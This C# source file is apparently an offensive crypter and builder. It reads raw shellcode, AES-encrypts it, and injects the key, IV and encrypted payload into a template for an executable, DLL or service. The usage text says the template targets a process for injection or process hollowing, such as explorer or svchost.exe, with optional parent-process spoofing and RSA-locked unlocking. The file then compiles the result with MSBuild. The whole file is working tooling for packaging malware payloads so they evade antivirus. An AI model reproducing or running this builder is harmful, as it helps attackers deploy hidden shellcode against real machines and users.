﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Security.Cryptography;
using System.Globalization;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.OpenSsl;
using Org.BouncyCastle.Security;

namespace Encrypt
{
    class Program
    {
        public static byte[] encrypted;
        public static StringBuilder eshellcode;
        public static string outputfile;
        public static bool Genkeys = false;
        public static string _publickey = "";
        private static Random random = new Random();
        static void Main(string[] args)
        {
            if (args == null || args.Length == 0)
            {
                Console.WriteLine("Usage: \r\n /T: Template file \r\n /S: Shellcode file \r\n /P: Process name to Inject into or Hollow. \r\n  Injecting: explorer\r\n  Hollowing: c:\\\\windows\\\\system32\\\\svchost.exe\r\n /X: Parent Process for Hollowing\r\n  Hollowing: explorer \r\n /A: Architecture x86 or x64 \r\n /F: Format exe, dll, or service \r\n /K: Generate RSA keys for unlocking ");
                return;
            }
            string template = "";
            string shellcodefile = "";
            string inject_hollow_target = "";
            string architecture = "";
            string format = "";
            string parent_process = "";
            string cd = Directory.GetCurrentDirectory();

            string[] reqargs =
            {
                "/T:",
                "/S:",
                "/A:",
                "/F:",
                "/P:"
            };
            var argtest = args.Select(i => i.Substring(0, 2).ToUpper()).ToArray();
            foreach (string i in reqargs)
            {
                if (argtest.Contains(i.Substring(0, 2).ToUpper()) == false)
                {
                    Console.WriteLine(i + " Required!");
                    return;
                }
            }
            foreach (string arg in args)
            {
                switch (arg.Substring(0, 2).ToUpper())
                {
                    case "/T":
                        template = arg.Substring(3);
                        break;
                    case "/S":
                        shellcodefile = arg.Substring(3);
                        break;
                    case "/P":
                        inject_hollow_target = arg.Substring(3);
                        break;
                    case "/A":
                        architecture = arg.Substring(3);
                        break;
                    case "/F":
                        format = arg.Substring(3);
                        break;
                    case "/X":
                        parent_process = arg.Substring(3);
                        break;
                    case "/K":
                        Genkeys = true;
                        break;
                    default:
                        // do other stuff...
                        break;
                }
            }
            // Create a new instance of the Aes class.  This generates a new key and initialization vector (IV).
            using (Aes myAes = Aes.Create())
            {
                if(Genkeys)
                {
                    var csp = new RSACryptoServiceProvider(); //Generate new keypair
                    var privkey = ExportPrivateKey(csp); //Export private key in .pem format for python
                    _publickey = $"string pubkeyraw = \"{csp.ToXmlString(false)}\";"; //Export public key in .xml format for c#
                    //string pubfile = "c:\\users\\user\\pub.pem";
                    var phrase = RandomString(5);
                    string privfile = cd + "\\" + phrase + ".pem";
                    //File.WriteAllText(pubfile, _publickey); //Write pub key to file
                    File.WriteAllText(privfile, privkey); //Write private key to file
                    Console.WriteLine("Private key written to: " + privfile + ". Transfer this file to same directory as RSA.py");

                }
                string[] temppath = template.Split('\\');
                temppath = temppath.Take(temppath.Length - 1).ToArray();
                string buildfile = String.Join("\\", temppath) + "\\" + temppath.Last() + ".csproj";
                if (format == "exe")
                {
                    outputfile = String.Join("\\", temppath) + "\\Program.cs";
                }
                else if (format == "dll")
                {
                    outputfile = String.Join("\\", temppath) + "\\Class1.cs";
                }
                else if (format == "service")
                {
                    outputfile = String.Join("\\", temppath) + "\\" + temppath.Last() + ".cs";
                    Console.WriteLine(outputfile);
                }

                if(shellcodefile.Contains(".txt"))
                {
                    //Read shellcode from file in string format
                    string fileinput = File.ReadAllText(shellcodefile);
                    //Remove "0x" chars from shellcode so 0xd3 becomes d3 and split string on , into a string array
                    string[] inputarray = fileinput.Replace("0x", string.Empty).Split(',');

                    //Convert each item into a byte and store in array eg. d3 becomes 0xd3 in byte array
                    byte[] buf = inputarray.Select(m => byte.Parse(m.ToString(), NumberStyles.HexNumber)).ToArray();
                    string bufstring = BitConverter.ToString(buf);
                    // Encrypt the shellcode and format
                    encrypted = EncryptStringToBytes_Aes(bufstring, myAes.Key, myAes.IV);
                    eshellcode = new StringBuilder(encrypted.Length * 2);
                    foreach (byte b in encrypted)
                    {
                        eshellcode.AppendFormat("0x{0:x2}, ", b);
                    }

                }
                else if(shellcodefile.Contains(".bin"))
                {
                    byte[] buff = File.ReadAllBytes(shellcodefile);
                    string bufstring = BitConverter.ToString(buff);
                    encrypted = EncryptStringToBytes_Aes(bufstring, myAes.Key, myAes.IV);
                    eshellcode = new StringBuilder(encrypted.Length * 2);
                    foreach (byte b in encrypted)
                    {
                        eshellcode.AppendFormat("0x{0:x2}, ", b);
                    }
                }

                //Convert AESkey and IV to strings, remove trailing characters from encrypted shellcode and format for output
                string MyKey = $"string MyKey = \"{ BitConverter.ToString(myAes.Key)}\";";
                string Myiv = $"string Myiv = \"{ BitConverter.ToString(myAes.IV)}\";";
                string parseshellcode = eshellcode.ToString().Remove(eshellcode.ToString().Length - 2, 2);
                //Console.WriteLine(parseshellcode);
                string formattedencryptedshellcode = "byte[] buf = new byte[" + encrypted.Length + "] {" + parseshellcode + "};";

                //Write Key, IV, and encrypted shellcode to console
                string[] output = { MyKey, Myiv, parseshellcode };
                //File.WriteAllLines(args[1], output);

                string text = File.ReadAllText(template);
                text = text.Replace("<KEY>", MyKey);
                text = text.Replace("<IV>", Myiv);
                text = text.Replace("<SHELLCODE>", formattedencryptedshellcode);
                text = text.Replace("<PROCESS>", inject_hollow_target);
                text = text.Replace("<PARENT>", parent_process);
                text = text.Replace("<PUBKEY>", _publickey);
                File.WriteAllText(outputfile, text); //Write out to Program.cs which is called in .csproj

                string buildcommand = " /C \"c:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\MSBuild\\Current\\Bin\\amd64\\MSBuild.exe\" " + buildfile + " /p:Configuration=Release /p:Platform=" + architecture + " /t:Clean,Build /p:OutputPath=" + cd;
                //Console.WriteLine(buildcommand);
                System.Diagnostics.Process.Start("CMD.exe", buildcommand);
            }
        }
        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }
        static byte[] EncryptStringToBytes_Aes(string plainText, byte[] Key, byte[] IV)
        {
            // Check arguments.
            if (plainText == null || plainText.Length <= 0)
                throw new ArgumentNullException("plainText");
            if (Key == null || Key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (IV == null || IV.Length <= 0)
                throw new ArgumentNullException("IV");
            byte[] encrypted;

            // Create an Aes object
            // with the specified key and IV.
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = Key;
                aesAlg.IV = IV;

                // Create an encryptor to perform the stream transform.
                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

                // Create the streams used for encryption.
                using (MemoryStream msEncrypt = new MemoryStream())
                {
                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                        {
                            //Write all data to the stream.
                            swEncrypt.Write(plainText);
                        }
                        encrypted = msEncrypt.ToArray();
                    }
                }
            }

            // Return the encrypted bytes from the memory stream.
            return encrypted;
        }
        private static void EncodeIntegerBigEndian(BinaryWriter stream, byte[] value, bool forceUnsigned = true)
        {
            stream.Write((byte)0x02); // INTEGER
            var prefixZeros = 0;
            for (var i = 0; i < value.Length; i++)
            {
                if (value[i] != 0) break;
                prefixZeros++;
            }
            if (value.Length - prefixZeros == 0)
            {
                EncodeLength(stream, 1);
                stream.Write((byte)0);
            }
            else
            {
                if (forceUnsigned && value[prefixZeros] > 0x7f)
                {
                    // Add a prefix zero to force unsigned if the MSB is 1
                    EncodeLength(stream, value.Length - prefixZeros + 1);
                    stream.Write((byte)0);
                }
                else
                {
                    EncodeLength(stream, value.Length - prefixZeros);
                }
                for (var i = prefixZeros; i < value.Length; i++)
                {
                    stream.Write(value[i]);
                }
            }
        }
        public static string ExportPrivateKey(RSACryptoServiceProvider csp)
        {
            StringWriter outputStream = new StringWriter();
            if (csp.PublicOnly) throw new ArgumentException("CSP does not contain a private key", "csp");
            var parameters = csp.ExportParameters(true);
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);
                writer.Write((byte)0x30); // SEQUENCE
                using (var innerStream = new MemoryStream())
                {
                    var innerWriter = new BinaryWriter(innerStream);
                    EncodeIntegerBigEndian(innerWriter, new byte[] { 0x00 }); // Version
                    EncodeIntegerBigEndian(innerWriter, parameters.Modulus);
                    EncodeIntegerBigEndian(innerWriter, parameters.Exponent);
                    EncodeIntegerBigEndian(innerWriter, parameters.D);
                    EncodeIntegerBigEndian(innerWriter, parameters.P);
                    EncodeIntegerBigEndian(innerWriter, parameters.Q);
                    EncodeIntegerBigEndian(innerWriter, parameters.DP);
                    EncodeIntegerBigEndian(innerWriter, parameters.DQ);
                    EncodeIntegerBigEndian(innerWriter, parameters.InverseQ);
                    var length = (int)innerStream.Length;
                    EncodeLength(writer, length);
                    writer.Write(innerStream.GetBuffer(), 0, length);
                }

                var base64 = Convert.ToBase64String(stream.GetBuffer(), 0, (int)stream.Length).ToCharArray();
                // WriteLine terminates with \r\n, we want only \n
                outputStream.Write("-----BEGIN RSA PRIVATE KEY-----\n");
                // Output as Base64 with lines chopped at 64 characters
                for (var i = 0; i < base64.Length; i += 64)
                {
                    outputStream.Write(base64, i, Math.Min(64, base64.Length - i));
                    outputStream.Write("\n");
                }
                outputStream.Write("-----END RSA PRIVATE KEY-----");
            }

            return outputStream.ToString();
        }
        private static void EncodeLength(BinaryWriter stream, int length)
        {
            if (length < 0) throw new ArgumentOutOfRangeException("length", "Length must be non-negative");
            if (length < 0x80)
            {
                // Short form
                stream.Write((byte)length);
            }
            else
            {
                // Long form
                var temp = length;
                var bytesRequired = 0;
                while (temp > 0)
                {
                    temp >>= 8;
                    bytesRequired++;
                }
                stream.Write((byte)(bytesRequired | 0x80));
                for (var i = bytesRequired - 1; i >= 0; i--)
                {
                    stream.Write((byte)(length >> (8 * i) & 0xff));
                }
            }
        }
    }
}